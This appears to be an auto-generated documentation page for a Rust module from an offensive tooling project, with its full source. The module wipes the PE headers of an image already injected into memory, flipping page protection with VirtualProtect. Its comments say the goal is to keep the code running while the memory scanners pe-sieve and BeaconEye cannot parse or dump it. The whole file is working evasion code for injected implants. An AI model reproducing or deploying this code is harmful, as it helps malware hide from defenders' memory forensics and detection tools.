# crowd — stomp.rs  (🅱️ B TIER — PE header stomping utility)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/stomp.rs` |
| **Lines** | 87 |
| **Tier** | P |
| **Cards** | T007-process-injection |
| **Role** | Stomping utilities |
| **Unsafe blocks** | 3 |

## Purpose

# crowd — stomp.rs  (🅱️ B TIER — PE header stomping utility)

PE Header Stomping — zeroes MZ/DOS/NT headers of a mapped image.
Verbatim from killaofking/crates/core/src/experimental/pe_header_stomp.rs.

## Public API

### `stomp` `unsafe` (line 20)
```rust
pub unsafe fn stomp(base: *mut u8, header_size: usize) -> usize
```
Zero the canonical PE header of an already-mapped image at `base`.

Stomps exactly `SizeOfHeaders` bytes (read from the optional header before
erasing).  After this call the image continues to execute from .text but
pe-sieve / BeaconEye cannot parse or dump it.

# Safety
* `base` must be the base address of a valid, fully-fixed-up PE image.
* The page must allow writes (caller must ensure PAGE_READWRITE first).
* Call this AFTER all relocations and IAT fixups are complete.

### `stomp_own` `unsafe` (line 33)
```rust
pub unsafe fn stomp_own(base: *mut u8) -> anyhow::Result<usize>
```
Derive `SizeOfHeaders` from the mapped image at `base`, then stomp.

# Safety
`base` must point to a valid mapped PE.  Reads the DOS + NT headers
to determine size before erasing.

### `stomp_mapped_region` `unsafe` (line 72)
```rust
pub unsafe fn stomp_mapped_region(base: *mut u8) -> anyhow::Result<usize>
```
Stomp a mapped region whose protection may not yet allow writes.
Temporarily changes the first 0x1000 bytes to PAGE_READWRITE, zeroes
SizeOfHeaders, then restores.

## Key Dependencies

- `use windows::Win32::System::Memory::{`

## Full Source

```rust
//! # crowd — stomp.rs  (🅱️ B TIER — PE header stomping utility)
//!
//! PE Header Stomping — zeroes MZ/DOS/NT headers of a mapped image.
//! Verbatim from killaofking/crates/core/src/experimental/pe_header_stomp.rs.

#![allow(dead_code)]

use std::ptr;

/// Zero the canonical PE header of an already-mapped image at `base`.
///
/// Stomps exactly `SizeOfHeaders` bytes (read from the optional header before
/// erasing).  After this call the image continues to execute from .text but
/// pe-sieve / BeaconEye cannot parse or dump it.
///
/// # Safety
/// * `base` must be the base address of a valid, fully-fixed-up PE image.
/// * The page must allow writes (caller must ensure PAGE_READWRITE first).
/// * Call this AFTER all relocations and IAT fixups are complete.
pub unsafe fn stomp(base: *mut u8, header_size: usize) -> usize {
    if base.is_null() || header_size == 0 {
        return 0;
    }
    ptr::write_bytes(base, 0u8, header_size);
    header_size
}

/// Derive `SizeOfHeaders` from the mapped image at `base`, then stomp.
///
/// # Safety
/// `base` must point to a valid mapped PE.  Reads the DOS + NT headers
/// to determine size before erasing.
pub unsafe fn stomp_own(base: *mut u8) -> anyhow::Result<usize> {
    if base.is_null() {
        return Err(anyhow::anyhow!("stomp_own: null base"));
    }
    // MZ check
    let dos_magic = *(base as *const u16);
    if dos_magic != 0x5A4D {
        // Already stomped or not a PE — no-op.
        return Ok(0);
    }
    // e_lfanew at offset 0x3C
    let e_lfanew = *(base.add(0x3C) as *const i32);
    if e_lfanew < 0 || e_lfanew as usize > 0x1000 {
        return Err(anyhow::anyhow!("stomp_own: invalid e_lfanew={:#x}", e_lfanew));
    }
    let nt_base = base.add(e_lfanew as usize);
    let nt_sig = *(nt_base as *const u32);
    if nt_sig != 0x0000_4550 {
        return Err(anyhow::anyhow!("stomp_own: invalid NT sig {:#x}", nt_sig));
    }
    // OptionalHeader.Magic at nt_base+4+20
    let magic = *(nt_base.add(24) as *const u16);
    let size_of_headers: u32 = if magic == 0x020B || magic == 0x010B {
        // SizeOfHeaders at optional+56 for both PE32 and PE32+
        *(nt_base.add(4 + 20 + 56) as *const u32)
    } else {
        return Err(anyhow::anyhow!("stomp_own: unknown optional magic {:#x}", magic));
    };
    if size_of_headers == 0 || size_of_headers as usize > 0x10000 {
        return Err(anyhow::anyhow!(
            "stomp_own: suspicious SizeOfHeaders={:#x}", size_of_headers
        ));
    }
    Ok(stomp(base, size_of_headers as usize))
}

/// Stomp a mapped region whose protection may not yet allow writes.
/// Temporarily changes the first 0x1000 bytes to PAGE_READWRITE, zeroes
/// SizeOfHeaders, then restores.
pub unsafe fn stomp_mapped_region(base: *mut u8) -> anyhow::Result<usize> {
    use windows::Win32::System::Memory::{
        VirtualProtect, PAGE_READWRITE, PAGE_PROTECTION_FLAGS,
    };

    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    VirtualProtect(
        base as _,
        0x1000,
        PAGE_READWRITE,
        &mut old_protect,
    )?;
    let result = stomp_own(base);
    let _ = VirtualProtect(base as _, 0x1000, old_protect, &mut old_protect);
    result
}

```